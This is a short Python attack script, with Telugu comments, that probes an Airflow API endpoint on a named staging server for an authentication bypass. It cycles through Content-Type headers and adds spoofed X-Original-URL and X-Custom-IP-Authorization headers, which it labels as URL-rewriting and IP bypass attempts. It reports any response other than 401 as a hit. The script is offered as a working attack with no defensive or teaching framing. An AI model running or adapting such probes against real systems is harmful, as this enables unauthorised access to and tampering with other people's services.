import requests
import json

url = "https://sm2a.staging.earth.gov/api/v1/dags/example/clearTaskInstances"

# రకరకాల Content-Types తో సర్వర్ ని కన్ఫ్యూజ్ చేద్దాం
content_types = [
    "application/json",
    "application/x-www-form-urlencoded",
    "text/plain",
    "application/xml"
]

data = {"dry_run": True, "reset_dag_runs": True}

print(f"[*] Starting Deep Content-Type Injection on: {url}")

for ct in content_types:
    headers = {
        "Content-Type": ct,
        "User-Agent": "Mozilla/5.0",
        "X-Original-URL": "/api/v1/dags/example/clearTaskInstances", # URL Rewriting bypass
        "X-Custom-IP-Authorization": "127.0.0.1" # IP bypass attempt
    }
    
    try:
        # జేసన్ డేటాని స్ట్రింగ్ లాగా పంపుదాం
        r = requests.post(url, data=json.dumps(data), headers=headers, timeout=10)
        print(f"[*] Testing with {ct} -> Status: {r.status_code}")
        
        if r.status_code != 401:
            print(f"[+++] ALERT! Status changed to {r.status_code} with {ct}!")
            print(r.text[:500])
            
    except Exception as e:
        print(f"[!] Error: {e}")

print("\n[*] Injection Complete.")
